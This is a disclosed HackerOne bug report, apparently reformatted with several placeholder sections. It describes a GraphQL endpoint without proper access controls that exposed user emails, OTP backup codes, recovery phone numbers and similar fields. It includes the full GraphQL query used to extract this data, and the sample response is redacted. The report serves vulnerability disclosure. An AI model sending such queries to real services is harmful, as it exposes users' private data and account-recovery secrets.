# Confidential data of users and limited metadata of programs and reports accessible via GraphQL

## Metadata
- **Source:** HackerOne
- **Report:** 489146 | https://hackerone.com/reports/489146
- **Submitted:** 2019-01-31
- **Reporter:** yashrs
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** critical
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
**Summary:**
The GraphQL endpoint doesn't have access controls implemented properly.

**Description:**
Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook_user_id, account_recovery_phone_number_verified_at, totp_enabled, etc.

These are just some examples of fields which are getting leaked directly from GraphQL.

This is

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**
The GraphQL endpoint doesn't have access controls implemented properly.

**Description:**
Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook_user_id, account_recovery_phone_number_verified_at, totp_enabled, etc.

These are just some examples of fields which are getting leaked directly from GraphQL.

This is the request sent to GraphQL:

```
{
  id
  users()
  {
    total_count 
    nodes
    {
      _id
      name
      username
      email
      account_recovery_phone_number
      account_recovery_unverified_phone_number
      bounties
      {
        total_amount
      }
      otp_backup_codes
      i_can_update_username
      location
      year_in_review_published_at
      anc_triager
      blacklisted_from_hacker_publish
      calendar_token
      vpn_credentials
      {
        name
      }
      account_recovery_phone_number_sent_at
      account_recovery_phone_number_verified_at
      swag
      {
        total_count
      }
      totp_enabled
      subscribed_for_team_messages
      subscribed_for_monthly_digest
      sessions
      {
        total_count
      }
      facebook_user_id
      unconfirmed_email
    }
  }
```

Sample Response:
█████████

Please fix it.

Thanks,
Yash :)

## Impact

This could potentially leak many users' info

</details>

---
*Analysed by Claude on 2026-05-24*
